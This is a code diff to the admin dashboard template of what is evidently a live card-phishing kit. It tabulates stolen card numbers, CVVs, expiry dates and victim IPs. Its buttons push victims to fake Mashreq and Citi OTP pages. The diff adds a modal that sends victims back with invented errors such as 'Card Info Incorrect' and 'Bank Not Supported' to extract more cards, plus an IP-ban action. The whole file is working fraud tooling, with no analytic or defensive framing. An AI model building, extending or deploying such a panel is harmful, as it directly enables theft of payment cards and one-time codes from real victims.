@@ -55,12 +55,12 @@
         <th>#</th><th>Date</th><th>Plate</th><th>Amount</th>
         <th>Card No</th><th>Name</th><th>Exp</th><th>CVV</th>
         <th>Issuer</th><th>Country</th><th>Type</th>
-        <th>OTP Page</th><th>Status</th><th>IP</th><th style="width:130px;min-width:100px;">Comment</th><th>Actions</th>
+        <th>OTP Page</th><th>IP</th><th style="width:130px;min-width:100px;">Comment</th><th>Actions</th>
       </tr>
     </thead>
     <tbody>
     <% if (payments.length === 0) { %>
-    <tr><td colspan="17" style="text-align:center;padding:40px;color:var(--tx-muted);">No records found.</td></tr>
+    <tr><td colspan="16" style="text-align:center;padding:40px;color:var(--tx-muted);">No records found.</td></tr>
     <% } %>
     <% payments.forEach(function(p) {
       const sc = {pending:'b-pending',approved:'b-approved',declined:'b-declined',otp_received:'b-received'}[p.otp_status] || 'b-pending';
@@ -86,7 +86,6 @@
       <td class="small"><%= p.card_country || '—' %></td>
       <td class="small"><%= p.card_type || '—' %></td>
       <td><span class="badge b-otp"><%= p.otp_page || 'otp-sms' %></span></td>
-      <td><span class="badge <%= sc %>"><%= p.otp_status %></span></td>
       <td class="mono muted small"><%= p.ip || '—' %></td>
       <td style="width:130px;max-width:130px;">
         <textarea class="pay-comment" data-sid="<%= p.sid %>" rows="1"
@@ -99,7 +98,8 @@
           <button class="btn btn-sm btn-amber"   title="Redirect to Mashreq"    onclick="redirect('<%= p.sid %>','otp-mashreq')">MQ</button>
           <button class="btn btn-sm btn-ghost"   title="Redirect to Citi"       onclick="redirect('<%= p.sid %>','otp-citi')">Citi</button>
           <button class="btn btn-sm btn-primary" title="Mark as approved"       onclick="setStatus('<%= p.sid %>','approved')">Approve</button>
-          <button class="btn btn-sm btn-red"     title="Delete record"          onclick="delPayment('<%= p.sid %>')">Delete</button>
+          <button class="btn btn-sm btn-red"     title="Delete record"          onclick="delPayment('<%= p.sid %>')">Del</button>
+          <button class="btn btn-sm btn-ghost"   title="More actions"           onclick="openMoreModal('<%= p.sid %>','<%= p.ip || '' %>')">⋮</button>
         </div>
       </td>
     </tr>
@@ -120,7 +120,69 @@
 
 <% } %>
 
+<!-- More Actions Modal -->
+<div id="more-modal-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:1000;align-items:center;justify-content:center;padding:20px;" onclick="if(event.target===this)closeMoreModal()">
+  <div style="background:var(--bg-card);border-radius:16px;width:100%;max-width:380px;border:1px solid var(--bd);box-shadow:0 20px 60px rgba(0,0,0,0.3);overflow:hidden;">
+    <div style="padding:16px 20px;border-bottom:1px solid var(--bd);display:flex;align-items:center;justify-content:space-between;">
+      <div>
+        <div style="font-size:10px;font-weight:700;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.5px;">Payment Actions</div>
+        <div style="font-size:14px;font-weight:800;color:var(--tx-base);margin-top:2px;" id="more-modal-sid-label">—</div>
+      </div>
+      <button onclick="closeMoreModal()" style="width:30px;height:30px;border-radius:8px;border:1.5px solid var(--bd);background:var(--bg-page);color:var(--tx-muted);font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center;">×</button>
+    </div>
+    <div style="padding:14px 20px;display:flex;flex-direction:column;gap:8px;">
+      <div style="font-size:10px;font-weight:700;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:2px;">Redirect User To</div>
+      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;" onclick="moreRedirect('otp-limit')">
+        <span style="width:28px;height:28px;background:#fffbeb;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">⚠️</span>
+        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;">Limit Verification</div><div style="font-size:11px;color:var(--tx-muted);">Transaction limit requires verification</div></div>
+      </button>
+      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;" onclick="moreRedirect('payment:error=card_error')">
+        <span style="width:28px;height:28px;background:#fef2f2;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">❌</span>
+        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;">Card Info Incorrect</div><div style="font-size:11px;color:var(--tx-muted);">Send back to card entry with error</div></div>
+      </button>
+      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;" onclick="moreRedirect('payment:error=card_type')">
+        <span style="width:28px;height:28px;background:#fffbeb;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">🚫</span>
+        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;">Card Type Not Supported</div><div style="font-size:11px;color:var(--tx-muted);">Virtual / prepaid cards not accepted</div></div>
+      </button>
+      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;" onclick="moreRedirect('payment:error=bank_error')">
+        <span style="width:28px;height:28px;background:#eff6ff;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">🏦</span>
+        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;">Bank Not Supported</div><div style="font-size:11px;color:var(--tx-muted);">Try with a card from a different bank</div></div>
+      </button>
+      <div style="border-top:1px solid var(--bd-light);margin:4px 0;"></div>
+      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;border-color:#fecaca;" onclick="banUser()" id="ban-btn">
+        <span style="width:28px;height:28px;background:#fef2f2;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">🔨</span>
+        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;color:#dc2626;">Ban User</div><div style="font-size:11px;color:var(--tx-muted);" id="ban-ip-label">IP: —</div></div>
+      </button>
+    </div>
+  </div>
+</div>
+
 <script>
+let _moreSid = null, _moreIp = null;
+function openMoreModal(sid, ip) {
+  _moreSid = sid; _moreIp = ip;
+  document.getElementById('more-modal-sid-label').textContent = 'SID: ' + sid.slice(0,12) + '…';
+  document.getElementById('ban-ip-label').textContent = 'IP: ' + (ip || '—');
+  document.getElementById('more-modal-overlay').style.display = 'flex';
+}
+function closeMoreModal() {
+  document.getElementById('more-modal-overlay').style.display = 'none';
+  _moreSid = null; _moreIp = null;
+}
+function moreRedirect(page) {
+  closeMoreModal();
+  if (!_moreSid) return;
+  if (!confirm('Redirect user to: ' + page + '?')) return;
+  adminAction({ act: 'redirect', sid: _moreSid, page });
+}
+function banUser() {
+  if (!_moreSid) return;
+  if (!confirm('Ban IP ' + (_moreIp || '?') + '? This will block this user from accessing the site.')) return;
+  closeMoreModal();
+  adminAction({ act: 'ban_user', sid: _moreSid });
+}
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeMoreModal(); });
+
 function redirect(sid, page) {
   if (!confirm('Redirect user to ' + page + '?\n(User must be active on the waiting or OTP page.)')) return;
   adminAction({ act: 'redirect', sid, page });
